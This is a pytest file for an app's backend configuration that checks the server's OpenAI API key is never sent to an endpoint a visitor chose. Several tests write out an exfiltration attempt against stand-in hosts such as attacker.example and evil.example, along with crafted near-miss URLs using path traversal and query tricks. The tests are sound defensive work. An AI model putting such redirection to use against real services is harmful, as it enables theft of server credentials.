"""Tests for the app's backend configuration — the multi-user security rules.

`app/backend_config.py` is pure (no Streamlit), so the rules are checked directly on
env dicts: public-demo parsing, and above all the credential rule — the server's
OPENAI_API_KEY must never be sent to an endpoint a visitor chose.
"""

import json
import sys
import urllib.request
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parent.parent
sys.path[:0] = [str(_ROOT / "app"), str(_ROOT / "src")]

from backend_config import (  # noqa: E402
    BackendChoice,
    demo_articles,
    is_public_demo,
    llm_kwargs,
    resolve_api_key,
    server_base_url,
)

from shared.llm import call_llm  # noqa: E402

_URL = "http://vllm.internal:8000/v1"
_SERVER = {"LLM_PROVIDER": "openai", "OPENAI_BASE_URL": _URL,
           "OPENAI_API_KEY": "server-secret", "OPENAI_MODEL": "served"}


# ---------------------------------------------------------------------------
# PUBLIC_DEMO / DEMO_ARTICLES parsing
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("value", ["1", "true", "TRUE", "yes", "on", " On "])
def test_public_demo_truthy(value):
    assert is_public_demo({"PUBLIC_DEMO": value})


@pytest.mark.parametrize("value", ["", "0", "false", "no", "off", "public"])
def test_public_demo_falsy(value):
    assert not is_public_demo({"PUBLIC_DEMO": value})


def test_public_demo_off_when_unset():
    assert not is_public_demo({})


def test_demo_articles():
    assert demo_articles({}) == 500
    assert demo_articles({"DEMO_ARTICLES": "200"}) == 200


# ---------------------------------------------------------------------------
# Credential rule
# ---------------------------------------------------------------------------

def test_server_key_goes_to_the_server_endpoint():
    kwargs = llm_kwargs(BackendChoice("openai", "m", _URL + "/"), _SERVER)  # trailing "/" ok
    assert kwargs == {"provider": "openai", "model": "m", "base_url": _URL + "/",
                      "api_key": "server-secret"}


def test_empty_base_url_means_the_server_endpoint():
    kwargs = llm_kwargs(BackendChoice("openai"), _SERVER)
    assert (kwargs["base_url"], kwargs["api_key"]) == (_URL, "server-secret")


def test_custom_endpoint_without_key_never_gets_the_server_key():
    # The exfiltration case: a visitor aims the app at their own server, key left empty.
    kwargs = llm_kwargs(BackendChoice("openai", "m", "https://attacker.example/v1"), _SERVER)
    assert kwargs["base_url"] == "https://attacker.example/v1"
    assert kwargs["api_key"] == "EMPTY"
    assert "server-secret" not in kwargs.values()


@pytest.mark.parametrize("url", [
    "http://vllm.internal:8000",                     # other path
    "http://vllm.internal:8000/v1/../../evil",
    "http://vllm.internal:8000/v1?next=evil",
    "http://vllm.internal:8000/v1.attacker.example",
    "https://vllm.internal:8000/v1",                 # other scheme
    "http://vllm.internal:8001/v1",                  # other port
])
def test_near_miss_urls_are_not_the_server_endpoint(url):
    assert resolve_api_key(url, "", _SERVER) == "EMPTY"


def test_custom_endpoint_uses_the_key_typed_in_the_session():
    choice = BackendChoice("openai", "gpt-4o-mini", "https://api.openai.com/v1", " sk-visitor ")
    assert llm_kwargs(choice, _SERVER)["api_key"] == "sk-visitor"


def test_typed_key_also_wins_on_the_server_endpoint():
    assert resolve_api_key(_URL, "sk-visitor", _SERVER) == "sk-visitor"


def test_no_server_key_configured():
    env = {k: v for k, v in _SERVER.items() if k != "OPENAI_API_KEY"}
    assert resolve_api_key(_URL, "", env) == "EMPTY"


def test_default_server_endpoint_when_unset():
    env = {"OPENAI_API_KEY": "server-secret"}
    assert server_base_url(env) == "http://localhost:8000/v1"
    assert resolve_api_key("http://localhost:8000/v1", "", env) == "server-secret"
    assert resolve_api_key("http://evil.example/v1", "", env) == "EMPTY"


def test_exfiltration_attempt_sends_no_secret_on_the_wire(monkeypatch):
    # End to end: session kwargs -> call_llm -> the (faked) HTTP request actually sent.
    sent = []

    class _Response:
        def read(self):
            return json.dumps({"choices": [{"message": {"content": "ok"}}]}).encode()

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

    def fake_urlopen(request, timeout=None):
        sent.append((request.full_url, request.get_header("Authorization")))
        return _Response()

    monkeypatch.setattr(urllib.request, "urlopen", fake_urlopen)
    monkeypatch.setenv("OPENAI_API_KEY", "server-secret")  # also in the real env
    choice = BackendChoice("openai", "m", "https://attacker.example/v1")
    call_llm("hi", **llm_kwargs(choice, _SERVER))
    assert sent == [("https://attacker.example/v1/chat/completions", "Bearer EMPTY")]


# ---------------------------------------------------------------------------
# Public demo: the session's choice is ignored
# ---------------------------------------------------------------------------

def test_public_demo_ignores_the_session_choice():
    env = {**_SERVER, "PUBLIC_DEMO": "1"}
    visitor = BackendChoice("openai", "other", "https://attacker.example/v1", "sk-visitor")
    assert llm_kwargs(visitor, env) == {"provider": "openai", "model": "served",
                                        "base_url": _URL, "api_key": "server-secret"}


def test_public_demo_uses_the_servers_hf_model():
    env = {"PUBLIC_DEMO": "yes", "LLM_PROVIDER": "huggingface",
           "HF_MODEL": "Qwen/Qwen2.5-1.5B-Instruct"}
    visitor = BackendChoice("huggingface", "someone/huge-70b-model")
    assert llm_kwargs(visitor, env) == {"provider": "huggingface",
                                        "model": "Qwen/Qwen2.5-1.5B-Instruct"}


def test_no_choice_means_the_server_backend():
    env = {"LLM_PROVIDER": "huggingface"}
    assert llm_kwargs(None, env) == {"provider": "huggingface", "model": "google/flan-t5-base"}


# ---------------------------------------------------------------------------
# Other providers
# ---------------------------------------------------------------------------

def test_non_openai_backends_carry_no_endpoint_or_key():
    kwargs = llm_kwargs(BackendChoice("ollama", "llama3.2:1b", "http://x", "k"), _SERVER)
    assert kwargs == {"provider": "ollama", "model": "llama3.2:1b"}


def test_blank_model_means_the_backend_default():
    assert llm_kwargs(BackendChoice("huggingface", "  "), {})["model"] is None
